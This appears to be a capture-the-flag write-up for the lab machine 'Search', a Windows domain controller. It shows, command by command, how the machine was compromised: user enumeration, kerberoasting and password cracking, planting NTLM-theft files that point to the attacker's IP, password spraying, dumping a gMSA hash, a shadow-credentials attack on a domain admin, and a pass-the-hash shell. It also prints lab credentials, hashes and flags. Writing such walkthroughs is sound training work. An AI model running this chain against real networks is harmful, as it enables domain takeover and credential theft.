
## CTF Writeup: Search

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.229.57              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-20 08:53 -0500
Nmap scan report for 10.129.229.57
Host is up (0.017s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-20 13:56:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-20T13:58:09+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-08-20T13:58:09+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-20T13:58:09+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-20T13:58:09+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2026-08-20T13:58:09+00:00; +2s from scanner time.
8172/tcp  open  ssl/unknown
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_ssl-date: 2026-08-20T13:58:09+00:00; +2s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49711/tcp open  msrpc         Microsoft Windows RPC
49735/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-20T13:57:05
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 255.42 seconds
```

The target seems to be an DC. The TCP Scan revealed information about the domain search.htb, the hostname research and the FQDN research.search.htb.

```
echo "10.129.229.57 research.search.htb search.htb research" | tee -a /etc/hosts
```

There seems to be an HTTP Server active on port 80 & an HTTPS Webserver on 443. Also another SSL marked service on port 8172. But upon inspecting it, we couldn't reach it.

Checked if anonymous or guest user access is enabled. Guest Account was disabled, but anonymous seemed to be authenticated, but is extremly restricted. Enumeration of anything didn't work!

```
nxc smb search.htb -u '' -p '' --users
```

Up on inspecting the webpage I identified an interesting Teams Tab and was able to identify possible usernames.

```
Keely Lyons
Dax Santiago
Sierra Frye
Kyle Stewart
Kaiara Spencer
Dave Simpson
Ben Thompson
Chris Stewart
Ham Brook
James Phelps
```

Enumerated Endpoints using feroxbuster. But didn't find anything.

```
feroxbuster --url https://search.htb
```

Enumerated Subdomains using ffuf. But didn't find anything.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://search.htb -H "Host: FUZZ.search.htb" -fs 44982
```

Let's utilize our username generator script in order to get usernames.

```
python3 username_generator.py --all /ctfs/htb/ad/search/creds/users.txt > users.txt
```

Verified three domain users.

```
kerbrute userenum --dc 10.129.229.57 --domain search.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/20/26 - Ronnie Flathers @ropnop

2026/08/20 09:43:51 >  Using KDC(s):
2026/08/20 09:43:51 >   10.129.229.57:88

2026/08/20 09:43:51 >  [+] VALID USERNAME:       Dax.Santiago@search.htb
2026/08/20 09:43:51 >  [+] VALID USERNAME:       Keely.Lyons@search.htb
2026/08/20 09:43:51 >  [+] VALID USERNAME:       Sierra.Frye@search.htb
2026/08/20 09:43:52 >  Done! Tested 177 usernames (3 valid) in 0.405 seconds
```

Performed ASREP-Roasting, but it didn't work.

```
impacket-GetNPUsers -dc-ip 10.129.229.57 search.htb/ -no-pass -usersfile users.txt
```

Sprayed users with the same password as username, but couldn't find anything.

```
nxc smb search.htb -u users.txt -p users.txt
```

Crawled the entire webpage in order to gain an password list with "cewl".

```
cewl http://search.htb -x 15 -o -w passwords.txt
```

Analyzed the webpage and identified an interesting picture which reveals an potential username & password!

```
Hope.Sharp:IsolationIsKey?
```

Identified that the new user is part actually an valid domain user.

```
kerbrute userenum --dc 10.129.229.57 --domain search.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/23/26 - Ronnie Flathers @ropnop

2026/08/23 16:08:50 >  Using KDC(s):
2026/08/23 16:08:50 >   10.129.229.57:88

2026/08/23 16:08:50 >  [+] VALID USERNAME:       Sierra.Frye@search.htb
2026/08/23 16:08:50 >  [+] VALID USERNAME:       Hope.Sharp@search.htb
2026/08/23 16:08:50 >  [+] VALID USERNAME:       Dax.Santiago@search.htb
2026/08/23 16:08:50 >  [+] VALID USERNAME:       Keely.Lyons@search.htb
2026/08/23 16:08:50 >  Done! Tested 4 usernames (4 valid) in 0.038 seconds
```

Enumerated SMB Shares and identified multiple interesting non-default SMB Shares "CertEnroll", "helpdesk" & "RedirectedFolders$". On which we have write and read permissions! 

```
nxc smb search.htb -u Hope.Sharp -p 'IsolationIsKey?' --shares
```

The CertEnroll SMB Share hints at an internally active CA. We downloaded all information inside this SMB Share.

```
smbclient \\\\search.htb/CertEnroll -U Hope.Sharp
Password for [WORKGROUP\Hope.Sharp]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Moved onto the "RedirectedFolders$" Share and downloaded all information.

```
smbclient \\\\search.htb/RedirectedFolders$ -U Hope.Sharp
Password for [WORKGROUP\Hope.Sharp]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

We were only able to download some information about Hope.Sharp & sierra.frye. But nothing with relevancy! Since we have write permissions on there user shares. Let's maybe put inside an malicious file to potentially perform an MITM Attack and capture an NTLM Hash. The only user besides Hope.Sharp in which we write permissions is sierra.frye which could hint that we can capture an NTLM Hash of her.

Generated malicious files.

```
python3 ntlm_theft.py -g all -s 10.10.14.57 -f hacked
```

Connected to the SMB Share and uploaded all malicious files onto sierra.frye's user directory.
I also navigated into the Desktop of the user and put all the files inside of there aswell!

```
smbclient \\\\search.htb/RedirectedFolders$ -U Hope.Sharp
Password for [WORKGROUP\Hope.Sharp]:
Try "help" to get a list of possible commands.
smb: \> cd sierra.frye\
smb: \sierra.frye\> recurse ON
smb: \sierra.frye\> prompt OFF
smb: \sierra.frye\> mput *
```

Started up responder on local machine.

```
responder -I tun0
```

After some time I wasn't able to capture any NTLM Hash, so I proceeded with enumerating domain users.

```
nxc smb search.htb -u Hope.Sharp -p 'IsolationIsKey?' --rid-brute > newusers.txt
```

Formatted output accordingly for future bruteforcing purposes and stored the users wordlist inside an users.txt wordlist.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Started up my BloodHound Instance on my local machine.

```
bloodhound-start
```

Downloaded Domain Information using bloodhound-python.

```
bloodhound-python -u Hope.Sharp -p 'IsolationIsKey?' -ns 10.129.229.57 -d search.htb -c all
```

Interestingly enough the output of bloodhound-python revealed failed DNS Resolves for machine subdomains and also the subdomains "Covid.search.htb & Research.search.htb".

I uploaded the domain information into my BloodHound instance and marked my current user Hope.Sharp as owned. I was also able to identify that we can kerberoast an service account for the web "web_svc".

Performed Kerberoasting and gained TGS for web_svc.

```
impacket-GetUserSPNs -dc-ip 10.129.229.57 -request-user 'web_svc' search.htb/Hope.Sharp:'IsolationIsKey?'
```

Revealed the SPN of the service account: RESEARCH/web_svc.search.htb:60001
Stored the TGS inside an web_svc file on my local machine and bruteforced an password out of the TGS.

```
john web_svc --wordlist=/usr/share/wordlists/rockyou.txt
```

```
web_svc:@3ONEmillionbaby
```

BloodHound doesn't reveal an attack path. Let's try & enumerate if we can perform an ADCS Attack using the service account.

It tells us that the target CA seems to be vulnerable to ESC8.

```
certipy-ad find -u web_svc -p '@3ONEmillionbaby' -dc-ip 10.129.229.57 -target search.htb -vulnerable -enabled
```

Let's download domain information with rusthound-ce to get a better understanding in BloodHound of ADCS.

```
rusthound-ce --domain search.htb -u web_svc -p '@3ONEmillionbaby'
```

This didn't work for some reason.. 

I'll proceed with enumerating further with the service account. Enumerated SMB Shares.

```
nxc smb search.htb -u web_svc -p '@3ONEmillionbaby' --shares
```

But didn't find anything interesting. I tried to check if another user reuses the same password as the service account and he did! 

```
nxc smb search.htb -u users.txt -p passwords.txt --shares
```

```
Edgar.Jacobs:@3ONEmillionbaby
```

Also he was able to view the helpdesk share, which is interesting.

```
smbclient \\\\search.htb/RedirectedFolders$ -U Edgar.Jacobs
Password for [WORKGROUP\Edgar.Jacobs]:
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

I downloaded all user dirs again and was able to access edgar.jacob's dir this time, which revealed an interesting "Phishing_Attempt.xlsx" file.

There seemed to be an list of usernames and the "C" Cell is missing / is minimized. Trying to move the cell so we can potentially see passwords didn't work since the .xlsx file has protected cells. We'll need to unprotect it! 

```
libreoffice --calc Phishing_Attempt.xlsx
```

In order to unprotect the columns, we can unzip the file, remove the sheetProtection section and then update the archive.

```
unzip Phishing_Attempt.xlsx
sed -i 's/<sheetProtection[^>]*>//' xl/worksheets/sheet2.xml
zip -fr Phishing_Attempt.xlsx *
```

View the .xlsx file again and now we can see the column.

```
libreoffice --calc Phishing_Attempt.xlsx
```

OR 

Convert the .xlsx file into an .csv file and viewed it.

```
ssconvert Phishing_Attempt.xlsx Hello.csv
```

Viewed the .csv file.

```
cat Hello.csv            
firstname,lastname,password,Username
Payton,Harmon,;;36!cried!INDIA!year!50;;,Payton.Harmon
Cortez,Hickman,..10-time-TALK-proud-66..,Cortez.Hickman
Bobby,Wolf,??47^before^WORLD^surprise^91??,Bobby.Wolf
Margaret,Robinson,//51+mountain+DEAR+noise+83//,Margaret.Robinson
Scarlett,Parks,++47|building|WARSAW|gave|60++,Scarlett.Parks
Eliezer,Jordan,!!05_goes_SEVEN_offer_83!!,Eliezer.Jordan
Hunter,Kirby,~~27%when%VILLAGE%full%00~~,Hunter.Kirby
Sierra,Frye,$$49=wide=STRAIGHT=jordan=28$$18,Sierra.Frye
Annabelle,Wells,==95~pass~QUIET~austria~77==,Annabelle.Wells
Eve,Galvan,//61!banker!FANCY!measure!25//,Eve.Galvan
Jeramiah,Fritz,??40:student:MAYOR:been:66??,Jeramiah.Fritz
Abby,Gonzalez,&&75:major:RADIO:state:93&&,Abby.Gonzalez
Joy,Costa,**30*venus*BALL*office*42**,Joy.Costa
Vincent,Sutton,**24&moment&BRAZIL&members&66**,Vincent.Sutton
```

Sprayed users with the credentials of the .xlsx file and itdentified valid credentials for user Sierra.Frye.

```
nxc smb search.htb -u users2.txt -p passwords.txt --continue-on-success
```

```
Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
```

We previously discovered that the user.txt flag is stored inside the Users Share of this user. Let's download the user.txt flag!

```
smbclient \\\\search.htb/RedirectedFolders$ -U Sierra.Frye
Password for [WORKGROUP\Sierra.Frye]:
Try "help" to get a list of possible commands.
smb: \> cd sierra.frye\
smb: \sierra.frye\> get user.txt
```

Retrieved user.txt out of the SMB Share.

```
abe7f96e9a89e8efdc3f90b71dab14d7
```
## Privilege Escalation

Marked the user as owned in BloodHound and identified that he has one Outbound Object Control set. The user is part of the ITSEC Group, which has an interesting ACL active on the gMSA who is responsible for managing service accounts. He has "ReadGMSAPassword" active. This ACL allows us to retrieve the NT Hash of the gMSA user.

I'll utilize the following script for this:

```
git clone https://github.com/timothyericsson/gMSADumper-ng.git
```

Started up and activated virtual environment

```
python3 -m venv myenv
source myenv/bin/activate
```

Download requirements

```
pip install -r requirements.txt
```

Executed the script and gained NT Hash.

```
python3 gMSADumper-ng.py -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb
[+] trying NTLM over LDAPS as SEARCH\Sierra.Frye
[+] NTLM over LDAPS succeeded
Users or groups who can read password for BIR-ADFS-GMSA$:
 > ITSec
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f
BIR-ADFS-GMSA$:aes256-cts-hmac-sha1-96:06e03fa99d7a99ee1e58d795dccc7065a08fe7629441e57ce463be2bc51acf38
BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:dc4a4346f54c0df29313ff8a21151a42
```

```
BIR-ADFS-GMSA$:e1e9fd9e46d0d747e1595167eedcec0f
```

Marked the gMSA User as owned in my local bloodhound instance and found out that he has an "GenericAll" ACL set over the Domain Admin "Tristan.Davies".

Let's perform an Shadow Credential Attack in order to retrieve the NTLM Hash of the DA.

```
certipy-ad shadow auto -u 'BIR-ADFS-GMSA$@search.htb' -hashes :e1e9fd9e46d0d747e1595167eedcec0f -account Tristan.Davies -dc-ip 10.129.229.57 -dc-host research.search.htb
```

We retrieved the NTLM Hash of the DA.

```
Tristan.Davies:26d6a06ddc3f00f8b08e7f73c9c63fd2
```

Verified that we comprimised the domain controller.

```
nxc smb search.htb -u Tristan.Davies -H 26d6a06ddc3f00f8b08e7f73c9c63fd2
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Tristan.Davies:26d6a06ddc3f00f8b08e7f73c9c63fd2 (Pwn3d!)
```

Connected to the Domain Controller using smbexec.

```
impacket-smbexec search.htb/Tristan.Davies@10.129.229.57 -hashes :26d6a06ddc3f00f8b08e7f73c9c63fd2
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
type C:\Users\Administrator\Desktop\root.txt
45a694d913954e6ce5955ab767789c98
```